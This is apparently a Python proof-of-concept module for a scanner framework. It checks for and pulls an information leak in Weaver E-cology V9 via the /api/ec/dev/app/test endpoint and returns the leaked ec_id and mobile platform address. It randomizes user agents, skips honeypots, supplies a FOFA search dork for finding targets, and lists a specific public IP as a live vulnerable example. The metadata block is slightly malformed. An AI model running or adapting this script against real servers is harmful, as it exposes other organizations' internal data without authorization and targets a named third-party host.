# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

# ...
import urllib3
import re
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-1-10",        # POC创建时间
        "UpdateDate" : "2022-1-10",        # POC创建时间
        "PocDesc" : """
            这个API接口漏洞只针对e-cology v9.0版本才有用,JS文件中有一个API接口：/api/ec/dev/app/test
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微 E-cology V9信息泄露",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微-e-cology",                     # 漏洞应用名称
        "AppVersion" : "无",                  # 漏洞应用版本
        "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            可以获取到响应的ec_id值和对应的IP泛微移动管理平台的地址
        """,                                # 漏洞简要描述

        "fofa-dork":"",  """
            app="泛微-EOffice"
        """                   # fofa搜索语句
        "example" : "http://106.75.133.16:9000/api/ec/dev/app/test",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/api/ec/dev/app/test" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)

            reg = """\{"msg":"[a-z]+",.+status":[a-z]+\}"""
            result = re.match(reg,req.text.strip())
            if req.status_code == 200 and result:

                vuln = [True,result.group(0)]

            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()